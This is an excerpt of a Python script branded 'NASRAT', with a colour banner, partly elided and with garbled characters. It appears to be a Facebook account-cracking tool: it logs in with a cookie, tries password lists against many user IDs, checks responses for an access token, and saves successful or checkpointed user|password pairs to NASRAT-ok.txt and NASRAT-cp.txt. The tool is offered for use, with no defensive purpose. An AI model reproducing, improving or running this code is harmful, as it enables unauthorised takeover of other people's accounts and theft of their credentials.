...
|  \| | / _ \ \___ \| |_) |  / _ \ | |
| |\  |/ ___ \ ___) |  _ <  / ___ \| |
|_| \_/_/   \_\____/|_| \_\/_/   \_\_|                                                      Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€ 
    \033[1;32m
[â—‡]-------------------------------------------------------
...
\033[1;92m==========================================================
\033[33;44m  NAME       NASRAT &ARYAN ðŸ–¤â¤ðŸ’š\033[0;m
\033[1;92m=========================================================="""   
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+923168609351');chigozie()
    try:
        ...
        os.system('xdg-open https://wa.me/+923168609351')
        bsn_menu()
    except AttributeError:
        print('\n %s[%sÃƒâ€”%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mNASRAT-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97NASRAT-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [NASRAT] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-NASRAT] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('NASRAT-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
